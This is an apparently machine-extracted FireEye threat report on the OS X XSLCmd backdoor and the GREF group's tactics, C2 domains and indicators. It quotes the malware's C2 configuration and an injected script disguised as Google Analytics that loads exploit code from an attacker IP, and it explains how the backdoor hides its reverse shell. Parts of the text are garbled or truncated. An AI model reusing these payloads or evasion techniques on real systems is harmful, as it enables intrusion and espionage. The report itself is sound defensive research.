    "plain_text": "**Introduction**\n\nFireEye Labs recently discovered a previously unknown variant of the APT backdoor XSLCmd – OSX.XSLCmd – which is\n\ndesigned to compromise Apple OS X systems. This backdoor shares a significant portion of its code with the Windows\nbased version of the XSLCmd backdoor that has been around since at least 2009.\n\nThis discovery, along with other industry findings, is a clear indicator that APT threat actors are shifting their eyes to OS\n\nX as it becomes an increasingly popular computing platform.\n\nAcross the global threat landscape, there has been a clear history of leveraging (or porting) Windows malware to the\n\nApple OS X platform. In 2012, AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word\n\n[that installs a backdoor named “MacControl” on OS X systems. The group responsible for those attacks had been](http://www.alienvault.com/open-threat-exchange/blog/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-contro)\n\n[targeting Tibetan non-government organizations (NGOs). It was later discovered that the code for this backdoor was](http://bad-bytes.blogspot.com/2012/07/maccontrol-cyber-espionage-rat-linked.html)\n\nborrowed from an existing Windows backdoor, whose source code can be found on several Chinese programming forums.\n\n[In 2013, Kaspersky reported on a threat actor group they named “IceFog” that had been attacking a large number of](http://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/)\n\nentities related to military, mass media, and technology in South Korea and Japan. This group developed their own\n\nbackdoor for both Windows and OS X. And just this year, Kaspersky published a report on a group they named\n\n[“Careto/Mask” that utilized an open source netcat-like project designed to run on *nix and Windows systems named ‘sbd’](http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf)\n\nwhich they wrapped in a custom built installer for OS X.\n\nBased on our historical intelligence, we believe the XSLCmd backdoor is used by APT, including a group that we call\n\n“GREF.” We track this threat group as “GREF” due to their propensity to use a variety of Google references in their\n\nactivities – some of which will be outlined later in this report. Our tracking of GREF dates back to at least the 2009\n\ntimeframe, but we believe they were active prior to this time as well.  Historically, GREF has targeted a wide range of\n\norganizations including the US Defense Industrial Base (DIB), electronics and engineering companies worldwide, as well\n\nas foundations and other NGO’s, especially those with interests in Asia.\n\n**XSLCmd for OS X Analysis**\n\nThe XSLCmd backdoor for OS X was submitted to VirusTotal (MD5: 60242ad3e1b6c4d417d4dfeb8fb464a1) on August\n\n10, 2014, with 0 detections at the time of submission. The sample is a universal Mach-O executable file supporting the\n\nPowerPC, x86, and x86-64 CPU architectures. The code within contains both an installation routine that is carried out\n\nthe first time it is executed on a system, and the backdoor routine which is carried out after confirming that its parent\n\nprocess is launchd (the initial user mode process of OS X that is responsible for, amongst other things, launching\n\ndaemons).\n\nThe backdoor code was ported to OS X from a Windows backdoor that has been used extensively in targeted attacks over\n\nthe past several years, having been updated many times in the process. Its capabilities include a reverse shell, file listings\n\nand transfers, installation of additional executables, and an updatable configuration. The OS X version of XSLCmd\n\nincludes two additional features not found in the Windows variants we have studied in depth: key logging and screen\n\ncapturing.\n\n\n-----\n\nTo install, XSLCmd first determines the endianness of the CPU using NXGetLocalArchInfo and whether or not it is\n\nrunning as the super user by comparing the return value of getuid()with 0. The code includes functions to handle\n\nendianness differences when dealing with file and network data on a system using big endian, namely older Apple\n\ncomputers that shipped with PowerPC CPUs. The process copies its Mach-O from its current location to\n\n$HOME/Library/LaunchAgents/clipboardd and creates a plist file in the same directory with the name\n\ncom.apple.service.clipboardd.plist. The latter file ensures that the backdoor is launched after the system is rebooted once\n\nthe user logs in. After this is done, the malware relaunches itself using the ‘load’ option of the launchctl utility, which\n\nruns the malware according to its configuration in the plist file it created, with launchd as its parent process. This is the\n\nprocess that begins the actual backdoor routine of waiting for and executing commands issued from the C2 server.\n\nAfter running itself with launchctl, the initial process forks and deletes the Mach-O from the original location from which\n\nit was executed. The installation routine differs slightly depending on whether or not the process is running with super\n\nuser privileges. If run as super user, it copies itself to /Library/Logs/clipboardd. Interestingly, if run as super user, the\n\nprocess will also copy /bin/ksh to /bin/ssh. /bin/ksh is the Korn shell executable, and if the user sends a command to\n\ninitialize a reverse shell, it will use the copy of ksh to do so instead of /bin/bash.\n\nThis is likely done to make it less obvious that a reverse shell is running on the system, since it may raise less suspicion to\n\nsee an ssh process opening a network socket rather than a bash process, although the real ssh executable is actually\n\nlocated in /usr/bin/ssh, not /bin/ssh. A list of possible files created by XSLCmd is included in Appendix 1 at the end of\n\nthis blog.\n\n**Configuration Options**\n\nXSLCmd ships with an encrypted configuration file that it defaults to if there is no configuration file written to disk. It\n\nwill only write its configuration file to disk if it’s updated by the user. It runs in a loop, checking for a configuration\n\nupdate, and then checking for commands. If a new configuration is available, it will be written to disk in base64 encoding\n\nat $HOME/.fontset/pxupdate.ini. Below is the configuration data stored in the XSLCmd sample we obtained.\n\n[ListenMode]\n\n0\n\n[MServer]\n\n61.128.110.38:8000\n\n[BServer]\n\n61.128.110.38\n\n[Day]\n\n1,2,3,4,5,6,7\n\n[Start Time]\n\n\n-----\n\n[End Time]\n\n23:59:00\n\n[Interval]\n\n60\n\n[MWeb]\n\nhttp://1234/config.htm\n\n[BWeb]\n\nhttp://1234/config.htm\n\n[MWebTrans]\n\n0\n\n[BWebTrans]\n\n0\n\n[FakeDomain]\n\nwww.appleupdate.biz\n\n[Proxy]\n\n0\n\n[Connect]\n\n1\n\n[Update]\n\n0\n\n[UpdateWeb]\n\nnot use\n\n[MServer] and [BServer] specify the main and backup C2 server addresses, which can be either an IP address or domain\n\nname. Only [MServer] needs to specify a port.\n\n[Day] specifies which days of the week the malware will poll for commands and configuration updates on where Monday\n\nis 1.\n\n\n-----\n\n[End Time] specifies the local time of day to stop polling.\n\n[Interval] specifies the number of seconds between polls.\n\n[MWeb] and [BWeb] specify the main and backup URLs to poll for configuration updates, respectively. Update checks\n\nare not performed if these values are left to their default: http://1234/config.htm\n\nOther options will be explained where appropriate later in the blog.\n\n**C2 Protocol**\n\nXSLCmd uses pseudo-HTTP for its protocol. It opens a socket and uses a string template to setup the HTTP request or\n\nresponse headers depending on whether or not it was configured for [Listen Mode]. If [Listen Mode] is set to 1, then it\n\nlistens on its socket, waiting for a connection for which it will reply to with HTTP response headers following this\n\ntemplate:\n\nHTTP/1.1 200 OK\n\nCache-Control: no-cache\n\nContent-Type: application/x-www-form-urlencoded\n\nServer: Apache/2.0.54 (Unix)\n\nContent-Encoding: gzip\n\nContent-Length: %d\n\nThe body after the headers, regardless of mode, will contain data specific to the purpose of the communication. The data\n\n[is encrypted with a scheme lifted from a game server engine written by a group named “My Destiny Team.” The request](http://read.pudn.com/downloads146/ebook/635386/src/gameserver/encdec.cpp__.htm)\n\nheaders have an interesting feature where the Host and Referer header values will have their domain values populated\n\nwith the value stored in [Fake Domain]. This value can be any string and has no effect on the network connection\n\nestablished. The value of the ‘s’ argument in the request URL is randomly generated, and all of the other request header\n\nvalues except for Content-Length are hard-coded.\n\n\n-----\n\nAnother interesting feature exists for the configuration update function. If [MWebTrans]/[BWebTrans] is set to 1, the\n\nconfiguration update URL request will be proxied through Yahoo’s Babelfish service and will fall back to the Google\n\nTranslate service if that fails.\n\nAs you can see, the ‘trurl’ parameter in the URL will be set to whatever is configured for [MWeb]/[BWeb]. The User\nAgent header for this request is hard-coded and contains the computer name in the parentheses at the end.\n\nSSL certificate strings were noticed during our analysis but with no direct cross reference to the certificate data\n\n\n-----\n\n,, pp, p\n\nInterestingly, the data contains everything needed for the server-side packets of an SSL handshake. The SSL certificate\n\nbeing used was for login.live.com and had expired on 6/16/2010. The code using this data opens a socket, waits for a\n\nconnection, and proceeds to carry out an SSL handshake with the client, throwing away whatever data it receives. This\n\ncode is not directly referenced by any other code in the executable but could very well replace the [Listen Mode] code.\n\nPerhaps it is an old feature no longer in use, a new feature yet to be fully implemented, or an optional feature only used in\n\ncertain cases.\n\n**Observations**\n\nWe noticed a mix of manually constructed and plain referenced strings throughout the code, sometimes side-by-side in\n\nthe same function even. This gives the impression of someone working with someone else’s code, adding his own touch\n\nand style here and there as he goes.\n\nAlso of note is that XSLCmd will not perform key logging if run as super user. This can be a problem, because the API\n\nused to perform the key logging, CGEventTapCreate, when invoked with the parameters it uses, requires root permissions\n\n\n-----\n\n, p g y\n\n10.8. In 10.9, enabling assistive devices permissions is done on a per application basis with no direct API to achieve this.\n\nIt is interesting to note that the version check does not account for versions above 10.8, indicating that perhaps 10.8 was\n\nthe latest version at the time the code was written, or at least the most common. Further supporting this inference is the\n\nlack of testing performed on 10.9. This variant uses an API from the private Admin framework that is no longer exported\n\nin 10.9, causing it to crash. The effort to support PowerPC with the endian conversion functions is worth mentioning.\n\nCoupling this observation with the aforementioned fact that elsewhere in the code, the version of OS X is compared with\n\n10.8, one could deduce that efforts were made to be backwards compatible with older OS X systems. For some frame of\n\nreference, Apple’s first OS to drop support for PowerPC was OS X 10.6 released in 2009, and OS X 10.9 was released in\n\nOctober of 2013.\n\n**Threat Actor Intelligence**\n\n**Historical Background**\n\nWhile GREF’s targeting interests overlap with many of the other threat groups we track, their TTP’s are somewhat\n\nunique. GREF is one of the few APT threat groups that does not rely on phishing as their primary attack method. While\n\nthey have been known to utilize phishing emails, including malicious attachments and links to exploit sites, they were one\n\nof the early adopters of strategic web compromise (SWC) attacks.\n\nGREF was especially busy in the 2010 timeframe, during which they had early access to a number of 0-day exploits\n\nincluding CVE-2010-0806 (IE 6-7 Peer Objects vuln), CVE-2010-1297 (Adobe Flash vuln), and CVE-2010-2884 (Adobe\n\nFlash) that they leveraged in both phishing and SWC attacks. Many of their SWC attacks we saw in this time period were\n\nhosted on defense industry-related sites including Center for Defense Information (cdi.org), National Defense Industrial\n\nAssociation (ndia.org), Interservice/Industry Training, Simulation and Education Conference (iitsec.org), and satellite\n\ncompany Millennium Space Systems (millennium-space.com).\n\nMost of those attacks involved embedding links to exploit code in the homepage of the affected website, and true to their\n\nmoniker the link was usually placed inside an existing Google Analytics code block in the page source code to help\n\nobscure it, rather than simply appended to the end of the file like many other attackers did.\n\nFigure 1: Sample “google” exploit link\n\n<!— Google Tracking Code —>\n\n<script type=”text/javascript”>\n\nvar gaJsHost = ((“https:” == document.location.protocol) ? “https://ssl.” : “http://”);\n\ndocument.write(unescape(“%3Cscript src=’” + gaJsHost + “180.149.252.181/wiki/tiwiki.ashx’\n\ntype=’text/javascript’%3E%3C/script%3E”));\n\n</script>\n\n\n-----\n\ng y g g, g p\n\ngroup appears to devote more resources (than most other groups) in attempting to penetrate web servers, and generally,\n\nthey make no attempt to obscure the attacks, often generating gigabytes of traffic in long-running attacks. They are\n\nknown to utilize open-source tools such as SQLMap to perform SQL injection, but their most obvious tool of choice is the\n\nweb vulnerability scanner Acunetix, which leaves tell-tale request patterns in web server logs. They have been known to\n\nleverage vulnerabilities in ColdFusion, Tomcat, JBoss, FCKEditor, and other web applications to gain access to servers,\n\nand then they will commonly deploy a variety of web shells relevant to the web application software running on the server\n\nto access and control the system.\n\nAnother historical TTP attributed to GREF was their frequent re-use of specific IP ranges to both perform reconnaissance\n\nand launch their attacks, as well as for command and control and exfiltration of data. In the early years, we documented\n\nthem routinely using IP addresses in the 210.211.31.x (China Virtual Telecom – Hong Kong), 180.149.252.x (Asia\n\nDatacenter – Hong Kong), and 120.50.47.x (Qala – Singapore). In addition, their reconnaissance activities frequently\n\nincluded referrer headers from google.com and google.com.hk with search features such as “inurl” and “filetype” looking\n\nfor specific systems, technologies, and known vulnerabilities.\n\n**C2 Domains**\n\nGREF is known to have sometimes configured their malware to bare IP addresses, rather than domains, but there are\n\nsome clusters of domain registrants that we attribute to them.\n\nTable 1: GREF domain registrations\n\n**Domain** **Registrant Email Address**\n\nallshell[.]net cooweb51[@]hotmail.com\n\nattoo1s[.]com cooweb51[@]hotmail.com\n\nkasparsky[.]net cooweb51[@]hotmail.com\n\nkocrmicrosoft[.]com cooweb51[@]hotmail.com\n\nmicrosoft.org[.]tw cooweb51[@]hotmail.com\n\nmicrosoftdomainadmin[.]com cooweb51[@]hotmail.com\n\nmicrosoftsp3[.]com cooweb51[@]hotmail.com\n\nplayncs[.]com cooweb51[@]hotmail.com\n\nsoftwareupdatevmware[.]com cooweb51[@]hotmail.com\n\nwindowsnine[.]net cooweb51[@]hotmail.com\n\ncdngoogle[.]com metasploit3[@]google.com\n\ncisco-inc[.]net metasploit3[@]google.com\n\nmremote[.]biz metasploit3[@]google.com\n\nofficescan[.]biz metasploit3[@]google.com\n\noprea[.]biz metasploit3[@]google.com\n\nbattle.com[.]tw 6g8wkx[@]gmail.com\n\ndiablo-iii[.]mobi 6g8wkx[@]gmail.com\n\nmicrosoftupdate[.]ws 6g8wkx[@]gmail.com\n\nmsftncsl[.]com 6g8wkx[@]gmail.com\n\nsquare enix[ ]us 6g8wkx[@]gmail com\n\n|Domain|Registrant Email Address|\n|---|---|\n|allshell[.]net|cooweb51[@]hotmail.com|\n|attoo1s[.]com|cooweb51[@]hotmail.com|\n|kasparsky[.]net|cooweb51[@]hotmail.com|\n|kocrmicrosoft[.]com|cooweb51[@]hotmail.com|\n|microsoft.org[.]tw|cooweb51[@]hotmail.com|\n|microsoftdomainadmin[.]com|cooweb51[@]hotmail.com|\n|microsoftsp3[.]com|cooweb51[@]hotmail.com|\n|playncs[.]com|cooweb51[@]hotmail.com|\n|softwareupdatevmware[.]com|cooweb51[@]hotmail.com|\n|windowsnine[.]net|cooweb51[@]hotmail.com|\n|cdngoogle[.]com|metasploit3[@]google.com|\n|cisco-inc[.]net|metasploit3[@]google.com|\n|mremote[.]biz|metasploit3[@]google.com|\n|officescan[.]biz|metasploit3[@]google.com|\n|oprea[.]biz|metasploit3[@]google.com|\n|battle.com[.]tw|6g8wkx[@]gmail.com|\n|diablo-iii[.]mobi|6g8wkx[@]gmail.com|\n|microsoftupdate[.]ws|6g8wkx[@]gmail.com|\n|msftncsl[.]com|6g8wkx[@]gmail.com|\n\n\n-----\n\n|gefacebook[.]com|6g8wkx[@]gmail.com|\n|---|---|\n|attoo1s[.]com|6g8wkx[@]gmail.com|\n|msnupdate[.]bz|skydrive1951[@]hotmail.com|\n|googlemapsoftware[.]com|skydrive1951[@]hotmail.com|\n\n\n**XSLCmd Usage**\n\nFor the majority of the time we’ve been tracking them, XSLCmd has been the “go-to” backdoor for GREF, as shown by the\n\nwide range of compile dates for the Windows samples we have: from 2009-01-05 to 2013-08-01. Appendix 2 provides a\n\npartial list of Windows sample hashes and configuration metadata.\n\nSince Mach-O binaries do not have a compile timestamp like Windows executables, we can only infer from other data\n\nwhen the OS X variant was developed. As mentioned above, the “FakeDomain” was configured to\n\n“www.appleupdate[.]biz”, which was originally registered on August 2, 2012, and the registration appears to have\n\nupdated on August 7, 2014, but the registrant is still the same “cast west”. When we found the sample on August 10, the\n\ndomain did not resolve and there were no historical records for appleupdate[.]biz in any of the passive DNS (pDNS)\n\nsources we checked. In the intervening weeks, it has been seen by pDNS sensors, with the first query occurring on August\n\n12, 2014 (which could be related to our research, since the hits are ‘nxdomain’), and then on August 16, 2014 there are\n\npDNS records pointing to 61.128.110.38, which you’ll notice is the same IP the OS X version was configured to use. This\n\ncould hint at the possibility that this OS X port of XSLCmd was recently developed and deployed; however, this remains\n\nuncertain.\n\n**Other Backdoor Usage**\n\nIn addition to XSLCmd, GREF has utilized a number of other backdoors over time. Another backdoor unique to them,\n\nwhich we call “ddrh”, is a limited-feature backdoor that was frequently dropped in the SWC attacks in 2010, but has not\n\nbeen seen much since.\n\nAnother historical backdoor attributed to GREF is one known as ERACS or Trojan.LURKER (not to be confused with\n\nLURK0 variant of Gh0st). This full-featured backdoor includes the usual backdoor functionality, including the support\n\nfor additional modules, but it also includes a USB monitoring capability that generates a directory listing of USB\nconnected devices.\n\nWe have also observed GREF using a handful of other common backdoors including Poison Ivy, Gh0st,\n\n9002/HOMEUNIX, HKDoor, and Briba, but these occurrences have been pretty rare. All of the GREF\n\n9002/HOMEUNIX samples in our repository have compile dates from 2009 or 2010. Interestingly enough, there is\n\n[some overlap with a cluster detailed in a report we released in November of last year, specifically the “AllShell” cluster](http://www.fireeye.com/resources/pdfs/fireeye-malware-supply-chain.pdf)\n\n(C2: smtp.allshell[.]net).\n\nStarting in mid-2012, GREF started using the Kaba/SOGU backdoor. These early samples, which were discussed in great\n\n[detail by LastLine in their blog post “An Analysis of PlugX,” are usually bundled into a RAR self-extracting executable and](http://labs.lastline.com/an-analysis-of-plugx)\n\nuses the three-part loading mechanism consisting of an executable, the malicious DLL that is side-loaded, and the\n\nshellcode file.\n\n\n-----\n\np, y p,\n\nApplications” version metadata.\n\n**Conclusion**\n\nThe “A” in APT is generally used to describe the threat actors as “Advanced”, but with this blog, we also see that they are\n\nalso “Adaptable.” Not only have they adopted new Windows-based backdoors over time, as Apple’s OS X platform has\n\nincreased in popularity in many companies, they have logically adapted their toolset to match in order to gain and\n\nmaintain a persistent foothold in the organizations they are targeting. OS X has gained popularity across enterprises,\n\nfrom less savvy users who find it easy to operate, to highly technical users that utilize its more powerful features, as well\n\nas with executives. Many people also consider it to be a more secure computing platform, which may lead to a dangerous\n\nsense of complacency in both IT departments and with users. In fact, while the security industry has started offering\n\nmore products for OS X systems, these systems are sometimes less regulated and monitored in corporate environments\n\nthan their Windows peers.\n\nClearly as the OS X platform becomes more widely adopted across enterprises, threat groups like GREF will continue to\n\nadapt and find ways to exploit that platform.\n\n_Credit to Jay Smith for his initial analysis of the Windows version of the XSLCmd backdoor and Joshua Homan for his_\n\n_assistance in this research._\n\nAppendix 1: XSLCmd for OS X created files\n\nFilename Purpose\n\n$HOME/Library/LaunchAgents/clipboardd executable\n\n/Library/Logs/clipboardd executable when run as super user\n\n$HOME/Library/LaunchAgents/com.apple.service.clipboardd.plist plist for persistence\n\n$HOME/.fontset/pxupdate.ini configuration file\n\n$HOME/.fontset/chkdiska.dat additional configuration file\n\n$HOME/.fontset/chkdiskc.dat additional configuration file\n\n$HOME/Library/Logs/BackupData/<year><month><day>_<hr>_<min>_<sec>_keys.log key log file\n\nAppendix 2: XSLCmd sample metadata\n\n|Filename|Purpose|\n|---|---|\n|$HOME/Library/LaunchAgents/clipboardd|executable|\n|/Library/Logs/clipboardd|executable when run as super user|\n|$HOME/Library/LaunchAgents/com.apple.service.clipboardd.plist|plist for persistence|\n|$HOME/.fontset/pxupdate.ini|configuration file|\n|$HOME/.fontset/chkdiska.dat|additional configuration file|\n|$HOME/.fontset/chkdiskc.dat|additional configuration file|\n|$HOME/Library/Logs/BackupData/<year><month><day>_<hr>_<min>_<sec>_keys.log|key log file|\n\n\n-----",
